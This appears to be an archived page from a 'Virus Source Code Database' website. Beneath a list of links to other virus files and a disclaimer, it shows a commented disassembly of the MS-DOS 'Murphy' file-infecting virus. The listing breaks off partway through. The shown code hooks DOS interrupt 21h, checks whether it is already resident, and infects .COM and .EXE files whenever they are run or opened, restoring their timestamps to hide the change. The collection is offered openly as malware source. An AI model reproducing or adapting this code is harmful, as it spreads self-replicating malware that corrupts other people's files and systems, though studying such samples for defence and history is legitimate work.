<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: m-murph__asm</title>
<meta name="KEYWORDS" content="m-murph_.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for m-murph_.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="madden__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/madden__asm.php">madden__asm</a><br>
<a href="madden_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/madden_asm.php">madden_asm</a><br>
<a href="maddenb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maddenb_asm.php">maddenb_asm</a><br>
<a href="made_334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made_334_asm.php">made_334_asm</a><br>
<a href="made-334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made-334_asm.php">made-334_asm</a><br>
<a href="made334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made334_asm.php">made334_asm</a><br>
<a href="makestnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/makestnd_asm.php">makestnd_asm</a><br>
<a href="maketorm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maketorm_asm.php">maketorm_asm</a><br>
<a href="malaria_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/malaria_asm.php">malaria_asm</a><br>
<a href="malmsey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/malmsey_asm.php">malmsey_asm</a><br>
<a href="manvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/manvir_asm.php">manvir_asm</a><br>
<a href="mar_860_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar_860_asm.php">mar_860_asm</a><br>
<a href="mar-860__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar-860__asm.php">mar-860__asm</a><br>
<a href="mar-860_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar-860_asm.php">mar-860_asm</a><br>
<a href="maria_k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maria_k_asm.php">maria_k_asm</a><br>
<a href="maria-k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maria-k_asm.php">maria-k_asm</a><br>
<a href="marked_x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/marked_x_asm.php">marked_x_asm</a><br>
<a href="marked-x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/marked-x_asm.php">marked-x_asm</a><br>
<a href="mark_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mark_ii_asm.php">mark_ii_asm</a><br>
<a href="mark-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mark-ii_asm.php">mark-ii_asm</a><br>
<a href="maruad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maruad_asm.php">maruad_asm</a><br>
<a href="massacre_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/massacre_asm.php">massacre_asm</a><br>
<a href="master_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/master_asm.php">master_asm</a><br>
<a href="mataj13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mataj13_asm.php">mataj13_asm</a><br>
<a href="matt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/matt_asm.php">matt_asm</a><br>
<a href="max_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/max_asm.php">max_asm</a><br>
<a href="mbug1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mbug1_asm.php">mbug1_asm</a><br>
<a href="mcwhale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mcwhale_asm.php">mcwhale_asm</a><br>
<a href="megabug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megabug_asm.php">megabug_asm</a><br>
<a href="megastel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megastel_asm.php">megastel_asm</a><br>
<a href="megatroj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megatroj_asm.php">megatroj_asm</a><br>
<a href="meltdown_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/meltdown_asm.php">meltdown_asm</a><br>
<a href="met_moon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/met_moon_asm.php">met_moon_asm</a><br>
<a href="met-moon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/met-moon_asm.php">met-moon_asm</a><br>
<a href="mg1a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1a_asm.php">mg1a_asm</a><br>
<a href="mg1b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1b_asm.php">mg1b_asm</a><br>
<a href="mg1c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1c_asm.php">mg1c_asm</a><br>
<a href="mg1d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1d_asm.php">mg1d_asm</a><br>
<a href="mg2_____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2_____asm.php">mg2_____asm</a><br>
<a href="mg2____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2____asm.php">mg2____asm</a><br>
<a href="mg2___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2___asm.php">mg2___asm</a><br>
<a href="mg2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2_asm.php">mg2_asm</a><br>
<a href="mg_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg_3_asm.php">mg_3_asm</a><br>
<a href="mg-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg-3_asm.php">mg-3_asm</a><br>
<a href="mg3__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg3__asm.php">mg3__asm</a><br>
<a href="mg3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg3_asm.php">mg3_asm</a><br>
<a href="mgagent1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent1_asm.php">mgagent1_asm</a><br>
<a href="mgagent2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent2_asm.php">mgagent2_asm</a><br>
<a href="mgagent3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent3_asm.php">mgagent3_asm</a><br>
<a href="mg__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg__asm.php">mg__asm</a><br>
<a href="m-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-gen_asm.php">m-gen_asm</a><br>
<a href="mgtest1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgtest1_asm.php">mgtest1_asm</a><br>
<a href="mgtest2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgtest2_asm.php">mgtest2_asm</a><br>
<a href="m_hivb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_hivb_asm.php">m_hivb_asm</a><br>
<a href="m-hivb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-hivb_asm.php">m-hivb_asm</a><br>
<a href="mich2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich2_asm.php">mich2_asm</a><br>
<a href="michangl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michangl_asm.php">michangl_asm</a><br>
<a href="mich_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich_asm.php">mich_asm</a><br>
<a href="michel2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michel2_asm.php">michel2_asm</a><br>
<a href="michel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michel_asm.php">michel_asm</a><br>
<a href="michfile_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michfile_asm.php">michfile_asm</a><br>
<a href="mich_ld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich_ld_asm.php">mich_ld_asm</a><br>
<a href="mich-ld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich-ld_asm.php">mich-ld_asm</a><br>
<a href="micro29_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/micro29_asm.php">micro29_asm</a><br>
<a href="mike_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mike_asm.php">mike_asm</a><br>
<a href="mike_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mike_c.php">mike_c</a><br>
<a href="mikey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mikey_asm.php">mikey_asm</a><br>
<a href="mindles__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindles__asm.php">mindles__asm</a><br>
<a href="mindless_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindless_asm.php">mindless_asm</a><br>
<a href="mindlss_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindlss_asm.php">mindlss_asm</a><br>
<a href="mini_35_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_35_asm.php">mini_35_asm</a><br>
<a href="mini-35_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-35_asm.php">mini-35_asm</a><br>
<a href="mini40__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini40__asm.php">mini40__asm</a><br>
<a href="mini40_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini40_asm.php">mini40_asm</a><br>
<a href="mini_42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_42b_asm.php">mini_42b_asm</a><br>
<a href="mini-42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-42b_asm.php">mini-42b_asm</a><br>
<a href="mini_45_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_45_asm.php">mini_45_asm</a><br>
<a href="mini_68_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_68_asm.php">mini_68_asm</a><br>
<a href="mini-68_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-68_asm.php">mini-68_asm</a><br>
<a href="mini_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_asm.php">mini_asm</a><br>
<a href="minimal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/minimal_asm.php">minimal_asm</a><br>
<a href="miniscul_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/miniscul_asm.php">miniscul_asm</a><br>
<a href="misery_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/misery_asm.php">misery_asm</a><br>
<a href="mix1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mix1_asm.php">mix1_asm</a><br>
<a href="mkworm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mkworm_asm.php">mkworm_asm</a><br>
<a href="ml_366a__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml_366a__asm.php">ml_366a__asm</a><br>
<a href="ml_366a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml_366a_asm.php">ml_366a_asm</a><br>
<a href="ml366a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml366a_asm.php">ml366a_asm</a><br>
<a href="mlp_1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mlp_1307_asm.php">mlp_1307_asm</a><br>
<a href="mlp-1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mlp-1307_asm.php">mlp-1307_asm</a><br>
<a href="mm_122_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mm_122_asm.php">mm_122_asm</a><br>
<a href="mmirdest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirdest_asm.php">mmirdest_asm</a><br>
<a href="mmirfade_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirfade_asm.php">mmirfade_asm</a><br>
<a href="mmirlisa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirlisa_asm.php">mmirlisa_asm</a><br>
<a href="mmirmoon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirmoon_asm.php">mmirmoon_asm</a><br>
<a href="mmirunkn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirunkn_asm.php">mmirunkn_asm</a><br>
<a href="m_murph1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_murph1_asm.php">m_murph1_asm</a><br>
<a href="m-murph1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph1_asm.php">m-murph1_asm</a><br>
<a href="m_murph2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_murph2_asm.php">m_murph2_asm</a><br>
<a href="m-murph2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph2_asm.php">m-murph2_asm</a><br>
<a href="m-murph__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph__asm.php">m-murph__asm</a><br>
<a href="mojave_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mojave_asm.php">mojave_asm</a><br>
<a href="monami_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monami_asm.php">monami_asm</a><br>
<a href="monkeys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monkeys_asm.php">monkeys_asm</a><br>
<a href="monxla_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monxla_asm.php">monxla_asm</a><br>
<a href="mordor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mordor_asm.php">mordor_asm</a><br>
<a href="morgoth__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/morgoth__asm.php">morgoth__asm</a><br>
<a href="morgoth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/morgoth_asm.php">morgoth_asm</a><br>
<a href="mpc-783_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpc-783_asm.php">mpc-783_asm</a><br>
<a href="mpciguan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpciguan_asm.php">mpciguan_asm</a><br>
<a href="mpcsnort_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpcsnort_asm.php">mpcsnort_asm</a><br>
<a href="mpsopc31_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpsopc31_asm.php">mpsopc31_asm</a><br>
<a href="mpsopc32_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpsopc32_asm.php">mpsopc32_asm</a><br>
<a href="msdos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/msdos_asm.php">msdos_asm</a><br>
<a href="mte_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mte_asm.php">mte_asm</a><br>
<a href="m_torma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_torma_asm.php">m_torma_asm</a><br>
<a href="m-torma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-torma_asm.php">m-torma_asm</a><br>
<a href="muad'di__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad'di__asm.php">muad'di__asm</a><br>
<a href="muad_dib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad_dib_asm.php">muad_dib_asm</a><br>
<a href="muad'dib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad'dib_asm.php">muad'dib_asm</a><br>
<a href="mudshark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mudshark_asm.php">mudshark_asm</a><br>
<a href="multiflu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/multiflu_asm.php">multiflu_asm</a><br>
<a href="multiplx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/multiplx_asm.php">multiplx_asm</a><br>
<a href="mummy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mummy_asm.php">mummy_asm</a><br>
<a href="mumzi!_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mumzi!_asm.php">mumzi!_asm</a><br>
<a href="murphexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/murphexe_asm.php">murphexe_asm</a><br>
<a href="murphy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/murphy_asm.php">murphy_asm</a><br>
<a href="musicbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/musicbug_asm.php">musicbug_asm</a><br>
<a href="mutate_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutate_asm.php">mutate_asm</a><br>
<a href="mutatint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutatint_asm.php">mutatint_asm</a><br>
<a href="mut_gard_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mut_gard_asm.php">mut_gard_asm</a><br>
<a href="mutint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutint_asm.php">mutint_asm</a><br>
<a href="mut-tiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mut-tiny_asm.php">mut-tiny_asm</a><br>
<a href="muttiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muttiny_asm.php">muttiny_asm</a><br>
<a href="mystic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mystic_asm.php">mystic_asm</a><br>
<a href="mystic-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mystic-b_asm.php">mystic-b_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

seg_b	segment	byte public
	assume cs:seg_b , ds:seg_b

	db	7 dup (0)				;0000  0007[00]

start:	jmp	l_0388						;0007  E9 037E

d_000A:	db	'MZ'						;000A  4D 5A
d_000C:	dw	0084h			;last page bytes	;000C  84 00
	dw	006Eh			;size of file (pages)	;000E  6E 00
	dw	0000h			;relocation entries nr	;0010  00 00
	dw	0020h			;size of header (para)	;0012  20 00
	dw	01C3h			;min nr of para required;0014  C3 01
	dw	0FFFFh			;max nr of para required;0016  FF FF
	dw	0EA3h			;SS			;0018  A3 0E
	dw	0080h			;SP			;001A  80 00 00 00 07 00
	dw	0000h			;negative sum		;001A  80 00 00 00 07 00
	dw	0007h			;IP			;001A  80 00 00 00 07 00
	dw	0D38h			;CS			;0020  38 0D

d_0022	dw	 0012h			;victim entry IP	;0022  12 00
d_0024	dw	 0CF2h			;victim entry CS	;0024  F2 0C
d_0026	dw	 0D38h			;virus segment		;0026  38 0D
	db	 37h, 70h				;0028  37 70
	db	 6Fh, 15h				;002A  6F 15
	db	 87h, 01h, 6Bh, 00h			;002C  87 01 6B 00

d_0030	dw	 1466h			;oryginal int 21h offs	;0030  66 14
d_0032	dw	 0275h			;		  seg	;0032  75 02

	db	 56h, 05h		;0034  56 05
	db	 66h, 0Fh		;0036  66 0F

					;oryginal or found in BIOS
d_0038	dw	 0F126h			;int 13h offs	;0038  26 F1
d_003A	dw	 0F000h			;  	 seg	;003A  00 F0

	db	 0CDh, 1Dh				;003C  CD 1D
	db	'p', 0					;003E  70 00

	db	" Hello, I'm Murphy. Nice"		;0040  20 48 65 6C 6C 6F
							;0046  2C 20 49 27 6D 20
							;004C  4D 75 72 70 68 79
							;0052  2E 20 4E 69 63 65
	db	" to meet you friend. I'm"		;0058  20 74 6F 20 6D 65
							;005E  65 74 20 79 6F 75
							;0064  20 66 72 69 65 6E
							;006A  64 2E 20 49 27 6D
	db	' written since Nov/Dec. Copywrit'	;0070  20 77 72 69 74 74
							;0076  65 6E 20 73 69 6E
							;007C  63 65 20 4E 6F 76
							;0082  2F 44 65 63 2E 20
							;0088  43 6F 70 79 77 72
							;008E  69 74
	db	'e '					;0090  65 20
	db	'(c)1989 by Lubo & Ian, Sofia, US'	;0092  28 63 29 31 39 38
							;0098  39 20 62 79 20 4C
							;009E  75 62 6F 20 26 20
							;00A4  49 61 6E 2C 20 53
							;00AA  6F 66 69 61 2C 20
							;00B0  55 53
	db	'M Laboratory. '			;00B2  4D 20 4C 61 62 6F
							;00B8  72 61 74 6F 72 79
							;00BE  2E 20

;=======================================================
;	New int 21h service routine
;-------------------------------------------------------
l_00C0:					;(= 1B9h in resident virus part)
	CALL	s_0352						;00C0  E8 8F 02
	CMP	AX,4B59h		;"virus installed ?"	;00C3  3D 59 4B
	JNZ	l_00D1			;-> no			;00C6  75 09
	PUSH	BP						;00C8  55
	MOV	BP,SP						;00C9  8B EC
	AND	WORD PTR [BP+06],0FFFEh	;clear carry flag	;00CB  83 66 06 FE
	POP	BP						;00CF  5D
	IRET							;00D0  CF

l_00D1:	CMP	AH,4Bh			;load/load & run ?	;00D1  80 FC 4B
	JZ	l_00E8			;-> yes			;00D4  74 12
	CMP	AX,3D00h		;open in R/O mode ?	;00D6  3D 00 3D
	JZ	l_00E8			;-> yes			;00D9  74 0D
	CMP	AX,6C00h		;DOS 4.0 extnd open/crea;00DB  3D 00 6C
	JNZ	l_00E5			;-> no, exit		;00DE  75 05
	CMP	BL,00			;R/O mode ?		;00E0  80 FB 00
	JZ      l_00E8			;-> yes			;00E3  74 03
l_00E5:	jmp	l_018D						;00E5  E9 00A5

;========================================================
;	File contamination
;--------------------------------------------------------
l_00E8:	push	es					;00E8  06
	push	ds					;00E9  1E
	push	di					;00EA  57
	push	si					;00EB  56
	push	bp					;00EC  55
	push	dx					;00ED  52
	push	cx					;00EE  51
	push	bx					;00EF  53
	push	ax					;00F0  50
	call	s_02BD					;00F1  E8 01C9
	cmp	ax,6C00h				;00F4  3D 6C00
	jne	l_00FB					;00F7  75 02
	mov	dx,si					;00F9  8B D6
l_00FB:	mov	cx,80h					;00FB  B9 0080
	mov	si,dx					;00FE  8B F2

l_0100:	inc	si					;0100  46
	mov	al,[si]					;0101  8A 04
	or	al,al					;0103  0A C0
	loopnz	l_0100					;0105  E0 F9

	sub	si,2					;0107  83 EE 02
	cmp	word ptr [si],4D4Fh			;010A  81 3C 4D4F
	je	l_0122					;010E  74 12
	cmp	word ptr [si],4558h			;0110  81 3C 4558
	je	l_0119					;0114  74 03
l_0116:	jmp	short l_0181				;0116  EB 69
	db	90h					;0118  90
l_0119:	cmp	word ptr [si-2],452Eh			;0119  81 7C FE 452E
	je	l_0129					;011E  74 09
	jmp	short l_0116				;0120  EB F4
l_0122:	cmp	word ptr [si-2],432Eh			;0122  81 7C FE 432E
	jne	l_0116					;0127  75 ED
l_0129:	mov	ax,3D02h				;0129  B8 3D02
	call	s_02B6					;012C  E8 0187
	jc	l_0181					;012F  72 50
	mov	bx,ax					;0131  8B D8
	mov	ax,5700h				;0133  B8 5700
	call	s_02B6					;0136  E8 017D
	mov	word ptr cs:[121h],cx			;0139  2E: 89 0E 0121
	mov	word ptr cs:[123h],dx			;013E  2E: 89 16 0123
	mov	ax,4200h				;0143  B8 4200
	xor	cx,cx					;0146  33 C9
	xor	dx,dx					;0148  33 D2
	call	s_02B6					;014A  E8 0169
	push	cs					;014D  0E
	pop	ds					;014E  1F
	mov	dx,103h					;014F  BA 0103
	mov	si,dx					;0152  8B F2
	mov	cx,18h					;0154  B9 0018
	mov	ah,3Fh			; '?'		;0157  B4 3F
	call	s_02B6					;0159  E8 015A
	jc	l_016C					;015C  72 0E
	cmp	word ptr [si],5A4Dh			;015E  81 3C 5A4D
	jne	l_0169					;0162  75 05
	call	s_0192					;0164  E8 002B
	jmp	short l_016C				;0167  EB 03
l_0169:	call	s_0262					;0169  E8 00F6
l_016C:	mov	ax,5701h				;016C  B8 5701
	mov	cx,word ptr cs:[121h]			;016F  2E: 8B 0E 0121
	mov	dx,word ptr cs:[123h]			;0174  2E: 8B 16 0123
	call	s_02B6					;0179  E8 013A
	mov	ah,3Eh			; '>'		;017C  B4 3E
	call	s_02B6					;017E  E8 0135
l_0181:	call	s_02FA					;0181  E8 0176
	pop	ax					;0184  58
	pop	bx					;0185  5B
	pop	cx					;0186  59
	pop	dx					;0187  5A
	pop	bp					;0188  5D
	pop	si					;0189  5E
	pop	di					;018A  5F
	pop	ds					;018B  1F
	pop	es					;018C  07

				;<- enter oryginal int 21h
l_018D:	jmp	dword ptr cs:[129h]	;=d_0030 (+100h - 7)	;018D  2E: FF 2E 0129


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

s_0192	proc	near
	mov	cx,[si+16h]				;0192  8B 4C 16
	add	cx,[si+8]				;0195  03 4C 08
	mov	ax,10h					;0198  B8 0010
	mul	cx					;019B  F7 E1
	add	ax,[si+14h]				;019D  03 44 14
	adc	dx,0					;01A0  83 D2 00
	push	dx					;01A3  52
	push	ax					;01A4  50
	mov	ax,4202h				;01A5  B8 4202
	xor	cx,cx					;01A8  33 C9
	xor	dx,dx					;01AA  33 D2
	call	s_02B6					;01AC  E8 0107
	cmp	dx,0					;01AF  83 FA 00
	jne	l_01BF					;01B2  75 0B
	cmp	ax,4FDh					;01B4  3D 04FD
	nop						;01B7  90
	jnc	l_01BF					;01B8  73 05
	pop	ax					;01BA  58
	pop	dx					;01BB  5A
	jmp	l_0244					;01BC  E9 0085
l_01BF:	mov	di,ax					;01BF  8B F8
	mov	bp,dx					;01C1  8B EA
	pop	cx					;01C3  59
	sub	ax,cx					;01C4  2B C1
	pop	cx					;01C6  59
	sbb	dx,cx					;01C7  1B D1
	cmp	word ptr [si+0Ch],0			;01C9  83 7C 0C 00
	je	l_0244					;01CD  74 75
	cmp	dx,0					;01CF  83 FA 00
